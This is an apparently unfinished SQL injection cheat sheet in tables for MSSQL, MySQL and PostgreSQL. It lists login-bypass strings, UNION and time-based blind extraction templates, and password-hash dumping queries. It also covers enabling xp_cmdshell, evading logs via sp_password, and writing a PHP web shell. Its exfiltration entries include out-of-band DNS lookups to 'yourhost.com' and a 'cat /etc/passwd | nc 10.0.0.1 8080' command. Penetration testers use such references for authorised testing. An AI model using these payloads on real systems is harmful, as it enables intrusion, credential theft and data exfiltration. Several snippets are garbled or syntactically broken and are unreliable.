###### still under construction

# MSSQL
Query | Command
------| ------
Version | SELECT @@VERSION;
 . | This command obtains the OS/Windows version of the system.
List Users | SELECT name FROM master..syslogins;
 . | This command lists the names of users from the table master..syslogins.
Current User | SELECT user_name();
. | This command obtains a name of recently logged in user.
. | SELECT system_user;
. | - This command obtains the current value of system_user.
. | SELECT user;
. | - This command obtains the name of impersonated user.
. | SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID;
. | - This command obtains the column name loginame from table master..sysprocesses having spid=@@SPID.
List all Database | SELECT name FROM master..sysdatabases;
. | - This command obtains the list of all the databases from database ‘master..sysdatabases’.
. | SELECT DB_NAME(N);
. | - This command obtains the DB_NAME present at N (Where N=0,1,2,3, …).
Current Database | SELECT DB_NAME();
. | — This command obtains the current database.
List Tables | SELECT name FROM sysobjects WHERE xtype = 'U';
. | — This command obtains the column ‘name’ from table sysobjects having xtype value ‘U’.
Column Names | SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')
. | - This command works only for reading current database’s tables.
. | SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';
. | - This command works globally. But you should change the master with the DB name which holds the table you want to read the columns and change ‘sometable’ with the table name.
Select Nth Row | SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC;
. | - This command obtains 9th row.
Select Nth Char | SELECT substring(‘abcd’, 3, 1);
. | - This command returns c.
If Statement |  IF (1=1) SELECT 1 ELSE SELECT 2;
. | -This command returns 1.
Case Statement | SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END;
. | - This command returns 1.
Comments | SELECT 1;
. | - This command is used for writing a comment.
. | SELECT /*comment*/1;
. | - This command is used to comment out a statement.
String without Quotes | SELECT CHAR(75)+CHAR(76)+CHAR(77);
. | - This command returns ‘KLM’.
Time Delay | WAITFOR DELAY ’0:0:5′;
. | - This command is used to pause for 5 seconds.
Command Execution | EXEC xp_cmdshell ‘net user’;
. | - priv 
. | On MSSQL 2005, and you may need to reactivate xp_cmdshell first as it’s disabled by default:
. | EXEC sp_configure ‘show advanced options’, 1; 
. | - priv 
. | RECONFIGURE; 
. | - priv
. | EXEC sp_configure ‘xp_cmdshell’, 1; 
. | - priv
. | RECONFIGURE; 
. | - priv
Make DNS Requests | declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’);
. | - These commands are used to make DNS request.
. | declare @host varchar(800); select @host = name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + ‘c$boot.ini”’);
. | - These commands are used to make DNS request.
. | - NB: Concatenation is not allowed in calls to these SPs, hence you have to use @host.
Bypassing Login Screens | .
SQL Injection, Login tricks | .
. | admin' --
. | admin' #
. | admin'/*
. | ' or 1=1—
. | ' or 1=1#
. | ' o r 1=1/*
. | ') or '1'='1—
. | ') or ('1'='1--
Bypassing second MD5 hash check login screens | If application is first getting the record by username and then compare returned MD5 with supplied password's MD5 then you need to some extra tricks to fool application to bypass authentication. You can union results with a known password and MD5 hash of supplied password. In this case application will compare your password and your supplied MD5 hash instead of MD5 from database.
. | Username : admin
. | Password : 1234 ' AND 1=0 UNION ALL SELECT 'admin',
. | '81dc9bdb52d04dc20036dbd8313ed055
. | 81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)
Union Injections | SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members
. | - With union you can do SQL queries cross-table. Basically you
can poison query to return records from another table. This
above example will combine results from both news table and
members table and return all of them.
Another Example: | ' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--
log in as admin user | .
. | DROP sampletable;--
. | DROP sampletable;#
. | Username: admin'--
. | SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'
. | - Using this command, you can log in as admin user.
List Passwords | SELECT name, password FROM master..sysxlogins;
. | - This command obtains the columns ‘name’ and ‘password’ from the table ‘master..sysxlogins’. It works only in MSSQL 2000.
. | SELECT name, password_hash FROM master.sys.sql_logins;
. | - This command obtains the columns ‘name’ and ‘password_hash’ from the table ‘master.sys.sql_logins’. It works only in MSSQL 2005.
List Password Hashes | SELECT name, password FROM master..sysxlogins
. | - this command obtains the columns ‘name’ and ‘password’
. | from the table ‘master..sysxlogins’.
. | - priv, mssql 2000.
. | SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins
. | - This command obtains the columns ‘name’ and ‘master.dbo.fn_varbintohexstr(password)’ from the table ‘master..sysxlogins’.
. | - priv, mssql 2000, Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer.
. | SELECT name, password_hash FROM master.sys.sql_logins
. | - This command obtains the columns ‘name’ and ‘password_hash’ from the table ‘master.sys.sql_logins’.
. | - priv, mssql 2005.
. | SELECT name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
. | - this command obtains the columns ‘name + ‘-’ + master.sys.fn_varbintohexstr(password_hash)’ from the table ‘master.sys.sql_logins’.
. | - priv, mssql 2005.
Covering Tracks | SQL Server don't log queries which includes sp_password for security reasons(!). So if you add --sp_password to your queries it will not be in SQL Server logs (of course still will be in web server logs, try to use POST if it's possible) Insert a file content to a table. If you don't know internal path of web application, you can read IIS (IIS 6 only) metabase file(%systemroot%\system32\inetsrv\MetaBase.xml) and then search in it to identify application path. Create table foo( line varchar(8000) ); bulk insert foo from 'c:\inetpub\wwwroot\login.asp'; Drop temp table; and repeat for another file
Create Users | EXEC sp_addlogin 'user', 'pass';
. | - This command creates a new SQL Server login where username is ‘user’ and password is ‘pass’.
Drop User | EXEC sp_droplogin 'user';
. | - This command drops a username = ‘user’ from SQL Server login.
Make User DBA | EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
. | - This command makes a ‘user’ DBA.
Local File Access | CREATE TABLE mydata (line varchar(8000));
. | BULK INSERT mydata FROM ‘c:boot.ini’;
. | DROP TABLE mydata;
. | - This command is used to gain Local File Access.
Hostname, IP Address | SELECT HOST_NAME();
. | - This command obtains the Hostname and IP address of a system.
Error Based SQLi attack: To throw conversion errors. | For integer inputs: convert(int,@@version);
. | For string inputs: ‘ + convert(int,@@version) +’;
Clear SQLi Tests: For Boolean SQL injection and silent attacks | product.asp?id=4;
. | product.asp?id=5-1;
. | product.asp?id=4 OR 1=1;
. | - These commands can be used as tests for Boolean SQL
injection and silent attacks. Error Messages | SELECT * FROM master..sysmessages;
. | - This command retrieves all the errors messages present in the SQL server.
Linked Servers | SELECT * FROM master..sysservers;
. | - This command retrieves all the Linked Servers.
. | ?vulnerableParam=1;DECLARE @x as int;DECLARE @w as char(6);SET @x=ASCII(SUBSTRING(({INJECTION}),1,1));IF @x=100 SET @w='0:0:14' ELSE SET @w='0:0:01';WAITFOR DELAY @w— {INJECTION} = You want to run the query.
. | - If the condition is true, will response after 14 seconds. If is false, will be delayed for one second.
Out of Band Channel | ?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', ({INJECT})+'.yourhost.com';'sa';'pwd', 'SELECT 1'); 
. | - This command makes DNS resolution request to {INJECT}.yourhost.com.
. | ?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+({INJECT})+'.yourhost.com\\test.txt'; EXEC master..xp_dirtree @q
. | - This command makes DNS resolution request to {INJECT}.yourhost.com.
. | - {INJECTION} = You want to run the query.
Default Databases | Northwind
. | Model
. | Sdb
. | pubs — not on sql server 2005
. | tempdb
Path of DB files | %PROGRAM_FILES%\Microsoft SQL
. | Server\MSSQL.1\MSSQL\Data\
Location of DB Files | EXEC sp_helpdb master;
. | - This command retrieves the location of master.mdf.
. | EXEC sp_helpdb pubs;
. | - This command retrieves the location of pubs.mdf. 
privileges | .
Current privs on a particular object in 2005, 2008 | SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’);
. | - This command returns a column name ‘permission_name’ from the table ‘master..fn_my_permissions’ where securable is set to ‘null’ and securable_class permission is set to current ‘DATABASE’.
. | SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’);
. | - This command returns a column name ‘permission_name’
. | from the table ‘master..fn_my_permissions’ where securable is set to ‘null’ and securable_class permission is set to current ‘SERVER’.
. | SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’);
. | - This command returns a column name ‘permission_name’
. | from the table ‘master..fn_my_permissions’ where securable is set to ‘master..syslogins’ and securable_class permission is set to current ‘OBJECT’.
. | SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);
. | - This command returns a column name ‘permission_name’
. | from the table ‘master..fn_my_permissions’ where securable is set to ‘sa’ and securable_class permissions are set on a ‘USER’.
. | - current privs in 2005, 2008
. | SELECT is_srvrolemember(‘sysadmin’);
. | - This command determines whether a current has ‘sysadmin’ privilege.
. | SELECT is_srvrolemember(‘dbcreator’);
. | - This command determines whether a current has ‘dbcreator’ privilege.
. | SELECT is_srvrolemember(‘bulkadmin’);
. | -This command determines whether a current has ‘bulkadmin’ privilege.
. | SELECT is_srvrolemember(‘diskadmin’);
. | - This command determines whether a current has ‘diskadmin’ privilege.
. | SELECT is_srvrolemember(‘processadmin’);
. | - This command determines whether a current has ‘processadmin’ privilege.
. | SELECT is_srvrolemember(‘serveradmin’);
. | - This command determines whether a current has ‘serveradmin’ privilege.
. | SELECT is_srvrolemember(‘setupadmin’);
. | - This command determines whether a current has ‘setupadmin’ privilege.
. | SELECT is_srvrolemember(‘securityadmin’);
. | - This command determines whether a current has ‘securityadmin’ privilege.
. | SELECT name FROM master..syslogins WHERE denylogin = 0;
. | -This command obtains column name ‘name’ from table master..syslogins having denylogin value as 0.
. | SELECT name FROM master..syslogins WHERE hasaccess = 1;
. | - This command obtains column name ‘name’ from table master..syslogins having hasaccess value as 1.
. | SELECT name FROM master..syslogins WHERE isntname = 0;
. | - This command obtains column name ‘name’ from table master..syslogins having isntname value as 0.
. | SELECT name FROM master..syslogins WHERE isntgroup = 0;
. | - This command obtains column name ‘name’ from table master..syslogins having isntgroup value as 0.
. | SELECT name FROM master..syslogins WHERE sysadmin = 1;
. | - This command obtains column name ‘name’ from table master..syslogins having sysadmin value as 1.
. | SELECT name FROM master..syslogins WHERE securityadmin = 1;
. | - This command obtains column name ‘name’ from table master..syslogins having securityadmin value as 1.
. | SELECT name FROM master..syslogins WHERE serveradmin = 1;
. | - This command obtains column name ‘name’ from table master..syslogins having serveradmin value as 1.
. | SELECT name FROM master..syslogins WHERE setupadmin = 1;
. | - This command obtains column name ‘name’ from table master..syslogins having setupadmin value as 1.
. | SELECT name FROM master..syslogins WHERE processadmin = 1;
. | - This command obtains column name ‘name’ from table master..syslogins having processadmin value as 1.
. | SELECT name FROM master..syslogins WHERE diskadmin = 1;
. | - This command obtains column name ‘name’ from table master..syslogins having diskadmin value as 1.
. | SELECT name FROM master..syslogins WHERE dbcreator = 1;
. | - This command obtains column name ‘name’ from table master..syslogins having dbcreator value as 1.
. | SELECT name FROM master..syslogins WHERE bulkadmin = 1;
. | - This command obtains column name ‘name’ from table master..syslogins having bulkadmin value as 1.

# MYSQL

Query | Command
------| ------
Version | SELECT @@VERSION;
. | - This command retrieves the system information of the
current installation of SQL Server | SELECT version();
. | - This command selects the specific version of a Server.
List Users | SELECT user FROM mysql.user;
. | - This command lists the column ‘user’ from the table ‘mysql.user’.
Current User | SELECT user();
. | - This command obtains the current MySQL user name and hostname.
. | SELECT system_user(); 
. | - This command obtains the current value of system_user.
List all Database | SELECT schema_name FROM information_schema.schemata; 
. | - for MySQL >= v5.0
. | - This command obtains a column name ‘schema_name’ having a list of databases from the table ‘schemata table’.
. | SELECT distinct(db) FROM mysql.db; 
. | - priv
Current Database | SELECT database();
. | - This command obtains the current MySQL database.
List Tables | SELECT table_name FROM information_schema.tables WHERE table_schema = 'tblUsers'
. | - This command obtains the column name ‘table_name’ from the table ‘information_schema.tables’ having table_schema value ‘tblUsers’. tblUsers -> tablename
Column Names | SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'tblUsers’
. | - This command obtains the columns name ‘table_name’ and ‘column_name’ from the table ‘information_schema.tables’ having table_schema value ‘tblUsers’. tblUsers -> tablename
. | SELECT table_schema, table_name FROM information_schema.columns WHERE column_name = 'username';
. | - This command obtains the columns name ‘table_name’ and ‘column_name’ from the table ‘information_schema.tables’ having table_schema value ‘username’.
Select Nth Row | SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 0;
. | - This command returns rows numbered from 0.
. | SELECT host,user FROM user ORDER BY host LIMIT 1 OFFSET 1;
. | - This command returns rows numbered from 0.
Select Nth Char | SELECT substr(‘abcd’, 3, 1);
. | - This command returns c.
If Statement | SELECT if(1=1,’foo’,'bar’); 
. | -returns ‘foo’
Case Statement | SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END;
. | - This command returns A.
Comments | SELECT 1; #comment
. |  - This command is used for writing a comment.
. | SELECT /*comment*/1;
. | - This command is used comment out a statement.
String without Quotes | SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))
. | - This command returns ‘KLM’.
Time Delay | SELECT BENCHMARK(1000000,MD5(‘A’)); SELECT SLEEP(5); -- >= 5.0.12
. | - This command triggers a measurable time delay.
Command Execution | If mysqld (<5.0) is running as root AND you compromise a DBA account you can execute OS commands by uploading a shared object file into /usr/lib (or similar). The .so file should contain a User Defined Function (UDF). raptor_udf.c explains exactly how you go about this. Remember to compile for the target architecture which may or may not be the same as your attack platform.
Make DNS Requests | N/A
Load File | ' UNION ALL SELECT LOAD_FILE('/etc/passwd') -- SELECT LOAD_FILE(0x633A5C626F6F742E696E69)
. | - This command will show the content of c:\boot.ini.
log in as admin user | DROP sampletable;--
. | DROP sampletable;#
. | Username : admin'--
. | : admin' or '1'='1'--
. | SELECT * FROM members WHERE $username = 'admin'--' AND $password = 'password'
. | - This command lists all the users from the column ‘members’ having $username value as ‘admin’ and $password value as ‘password’.
List Passwords | SELECT user, password FROM mysql.user;
. | - This command retrieves the columns ‘user’ and ‘password‘ from the table ‘mysql.user’.
. | SELECT user, password FROM mysql.user LIMIT 1,1;
. | - This command retrieves the columns ‘user’ and ‘password‘ from the table ‘mysql.user’ with LIMIT 1,1.
. | SELECT password FROM mysql.user WHERE user = 'root';
. | - This command retrieves the column ‘password‘ from the table ‘mysql.user’ having user value as ‘root’.
List Password Hashes | SELECT host, user, password FROM mysql.user;
. | - This command lists columns ‘host’, ‘user’ and ‘password’ from the table ‘mysql.user’.
Bulk Insert | SELECT * FROM mytable INTO dumpfile '/tmp/somefile';
. | - This command is used to insert a file content to a table.
Create Users | CREATE USER username IDENTIFIED BY 'password';
. | - This command creates a username ‘USER’ who authenticates by password to log on to the database.
Drop User | DROP USER username;
. | - This command drops a username ‘USER’ from the table.
Make User DBA | GRANT ALL PRIVILEGES ON *.* TO username@'%';
. |  - This command grants DBA privileges to a user.
Local File Access | …’ UNION ALL SELECT LOAD_FILE(‘/etc/passwd’)
. | - This command allows you to only read world-readable files.
. | SELECT * FROM mytable INTO dumpfile ‘/tmp/somefile’;
. | - This command allows you to write to file system.
Hostname, IP Address | SELECT @@hostname;
. | - This command obtains the Hostname and IP address of a system
Error Based SQLi attack: To throw conversion errors. | .
. | (select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1));
. | - This command is used to receive integer inputs.
. | - '+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+';
. |  - This command is used to receive string inputs.
Clear SQLi Tests: For Boolean SQL injection and silent attacks | .
. | product.php?id=4
. | product.php?id=5-1
. | product.php?id=4 OR 1=1
. | product.php?id=-1 OR 17-7=10
. | - These commands can be used to test for Boolean SQL
injection and silent attacks. Blind SQL Injection (Time Based) | .
. | SLEEP(25)--
. | SELECT BENCHMARK(1000000,MD5('A'));
. | ProductID=1 OR SLEEP(25)=0 LIMIT 1—
. | ProductID=1) OR SLEEP(25)=0 LIMIT 1--
. | ProductID=1' OR SLEEP(25)=0 LIMIT 1—
. | ProductID=1') OR SLEEP(25)=0 LIMIT 1--
. | ProductID=1)) OR SLEEP(25)=0 LIMIT 1—
. | ProductID=SELECT SLEEP(25)—
. | - These commands trigger a measurable time delay.
Time base SQLi exploitation | ?vulnerableParam=-99 OR IF((ASCII(MID(({INJECTON}),1,1)) = 100),SLEEP(14),1) = 0 LIMIT 1— 
. |  {INJECTION} = You want to run the query.
. | - If the condition is true, will response after 14 seconds. If is false, will be delayed for one second.
Out of Band Channel | ?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',({INJECTION}), 'yourhost.com\\')));
. | - This command makes a NBNS query request/DNS resolution request to yourhost.com.
. | ?vulnerableParam=-99 OR (SELECT ({INJECTION}) INTO OUTFILE '\\\\yourhost.com\\share\\output.txt');
. | - This command writes data to your shared folder/file. {INJECTION} = You want to run the query.
Default Databases | information_schema (>= mysql 5.0)
. | mysql
Path of DB files | SELECT @@datadir C:\AppServ\MySQL\data\
Location of DB Files | SELECT @@datadir;
. | - This command obtains the location of DB files.
privileges | .
. | SELECT grantee, privilege_type, is_grantable FROM information_schema.user_privileges;
. | - This command lists list user privileges.
. | SELECT host, user, Select_priv, Insert_priv, Update_priv, Delete_priv, Create_priv, Drop_priv, Reload_priv, Shutdown_priv, Process_priv, File_priv, Grant_priv, References_priv, Index_priv, Alter_priv, Show_db_priv, Super_priv, Create_tmp_table_priv, Lock_tables_priv, Execute_priv, Repl_slave_priv, Repl_client_priv FROM mysql.user;
. | - This command lists list various types of privileges.
. | list user privsSELECT grantee, table_schema, privilege_type FROM information_schema.schema_privileges;
. | - This command lists privileges on databases (schemas).
. | SELECT table_schema, table_name, column_name, privilege_type FROM information_schema.column_privileges;
. | - This command lists privileges on columns.

# POSTGRESSQL

Query | Command
------| ------
Version | SELECT version();
. | - This command obtains the version and built information of a database.
List Users | SELECT usename FROM pg_user;
. | - This command obtains the column ‘usename’ from the table ‘pg_user’.
Current User | SELECT user;
. | - This command obtains a name of recently logged in user.
. | SELECT current_user;
. | - This command obtains a name of current user.
. | SELECT session_user;
. | - This command obtains a name of current session user.
. | SELECT usename FROM pg_user;
. | - This command obtains the column ‘usename’ from table ‘pg_user’.
. | SELECT getpgusername();
. | - This command obtains the user name in current session.
List all Database | SELECT datname FROM pg_database;
. | - This command obtains the list of database in column ‘datname’ from table ‘pg_database’.
Current Database | SELECT current_database();
. | - This command obtains the current database.
Load File | SELECT pg_read_file('global/pg_hba.conf',0,10000000);
. | - This command is used to read only the content of the DATA directory.
List Tables | SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace WHERE c.relkind IN (‘r’,”) AND n.nspname NOT IN (‘pg_catalog’, ‘pg_toast’) AND pg_catalog.pg_table_is_visible(c.oid);
. | - This command lists the tables present in the database. 
List Columns | SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A, pg_type T WHERE (C.relkind=’r') AND (N.oid=C.relnamespace) AND (A.attrelid=C.oid) AND (A.atttypid=T.oid) AND (A.attnum>0) AND (NOT A.attisdropped) AND (N.nspname ILIKE ‘public’);
. | - This command lists the columns present in the database.
Select Nth Row | SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 0;
. | - This command returns rows numbered from 0.
. | SELECT usename FROM pg_user ORDER BY usename LIMIT 1 OFFSET 1;
. | - This command returns rows numbered from 1.
Select Nth Char | SELECT substr(‘abcd’, 3, 1);
. | - This command returns c.
If Statement | IF statements only seem valid inside functions, therefore they are of less use in SQL injection statement. See CASE statement instead.
Case Statement | SELECT CASE WHEN (1=1) THEN ‘A’ ELSE ‘B’ END;
. | - This command returns A.
Comments | SELECT 1;
. | - This command is used for writing a comment.
. | SELECT /*comment*/1;
. | - This command is used to comment out a statement.
String without Quotes | SELECT (CHAR(75)||CHAR(76)||CHAR(77))
. | - This command will return ‘KLM’.
Time Delay | SELECT pg_sleep(10);
. | - This command triggers a measurable sleep time.
. | - In postgres is 8.2+ only.
. | CREATE OR REPLACE FUNCTION sleep(int) RETURNS int AS ‘/lib/libc.so.6′, ‘sleep’ language ‘C’ STRICT; SELECT sleep(10);
. | - This command is to create your own sleep function.
Command Execution | CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS ‘/lib/libc.so.6′, ‘system’ LANGUAGE ‘C’ STRICT; 
. | - priv
. | SELECT system(‘cat /etc/passwd | nc 10.0.0.1 8080′);
. | - This commands run as postgres/pgsql OS-level user.
Make DNS Requests | Generally, not it is not applicable in postgres. However, if contrib/dblinkis installed (it isn’t by default) it can be used to resolve hostnames (assuming you have DBA rights): SELECT * FROM dblink('host=put.your.hostname.here user=someuser dbname=somedb', 'SELECT version()') RETURNS (result TEXT); Alternatively, if you have DBA rights you could run an OS-level command (see below) to resolve hostnames, e.g. “ping pentestmonkey.net”.
Remote Authentication | You should add “host” record to the pg_hba.conf file located in the DATA directory. host all all 192.168.20.0/24 md5;
List Passwords | SELECT pg_read_file('global/pg_auth',0,10000000);
. | - This command lists passwords from a given database.
List Password Hashes | SELECT usename, passwd FROM pg_shadow;
. | - This command is used obtain password hashes from a given database.
Bulk Insert | To read data from local files, first you should create a temporary file for that. Read file contents into this table, then read the data from table.
. | CREATE TABLE temptable(t text);
. | COPY temptable FROM 'c:/boot.ini';
. | SELECT * FROM temptable LIMIT 1 OFFSET 0
. | This functionality needs permissions for the service user who has been running database service. On default, it is not possible to read local files on Windows systems because postgres user doesn’t have read permissions. Drop the temporary file after exploitation. DROP TABLE temptable;
Create Users | CREATE USER test1 PASSWORD ‘pass1';
. | - This command creates a user name ‘USER test1’ having password ‘pass1’.
. | CREATE USER test1 PASSWORD ‘pass1' CREATEUSER;
. | - This command creates a user name ‘USER test1’ having password ‘pass1’ and at the same time privileges are granted the user.
Drop User | DROP USER test1;
. | - This command drops user name ‘USER test1’.
List DBA Accounts | SELECT usename FROM pg_user WHERE usesuper IS TRUE
. | - This command obtains a list of user names with DBA privileges.
Make user DBA | ALTER USER test1 CREATEUSER CREATEDB;
. | - This command grants DBA privileges to a user name ‘USER test1’.
Local File Access | CREATE TABLE mydata(t text);
. | COPY mydata FROM ‘/etc/passwd’;
. | - priv, can read files which are readable by postgres OS-level
user
. | …’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 1;
. | - This command gets data back one row at a time.
. | …’ UNION ALL SELECT t FROM mydata LIMIT 1 OFFSET 2;
. | - This command gets data back one row at a time.
. | DROP TABLE mytest mytest;Write to a file:
. | - This command drops a table and then write it to another text file.
. | CREATE TABLE mytable (mycol text); 
. | INSERT INTO mytable(mycol) VALUES (‘<?
. | pasthru($_GET[cmd]); ?>’);
. | COPY mytable (mycol) TO ‘/tmp/test.php’;
. | - priv, write files as postgres OS-level user. Generally, you will not be able to write to the web root.
. | - priv user can also read/write files by mapping libc functions.
Hostname, IP Address | SELECT inet_server_addr();
. | - This command returns db server IP address (or null if using local connection).
. | SELECT inet_server_port();
. | - This command returns db server IP address (or null if using local connection)
Error Based SQLi attack: To throw conversion errors. | cast((chr(95)||current_database()) as numeric);
. | - This command is used to receive integer inputs.
. | '||cast((chr(95)||current_database()) as numeric)||';
. | -  This command is used to receive string inputs.
Clear SQLi Tests: For Boolean SQL injection and silent attacks | .
. | product.php?id=4
. | product.php?id=5-1
. | product.php?id=4 OR 1=1
. | product.php?id=-1 OR 17-7=10
. | - These commands can be used as tests for Boolean SQLinjection and silent attacks.
Time based SQLi Exploitation | ?vulnerableParam=-1; SELECT CASE WHEN (COALESCE(ASCII(SUBSTR(({INJECTION}),1,1)),0) > 100) THEN pg_sleep(14) ELSE pg_sleep(0) END LIMIT 1--+;
. | {INJECTION} = You want to run the query.
. | - If the condition is true, will response after 14 seconds. If is false, will be delayed for one second.
Default Databases | template0
. | template1
Path of DB files | SELECT current_setting('data_directory');
. | -This command returns the path of data_directory
. | (C:/Program Files/PostgreSQL/8.3/data)
. | SELECT current_setting('hba_file');
. | - This command returns the path of hba_file (C:/Program Files/PostgreSQL/8.3/data/pg_hba.conf)
Location of DB Files | SELECT current_setting(‘data_directory’);
. | -This command returns the location of the data_directory.
. | SELECT current_setting(‘hba_file’);
. | - This command returns the location of the hba_file. 
privileges | SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user
. | This command returns the user names along with their privileges from the table ‘pg_user’.
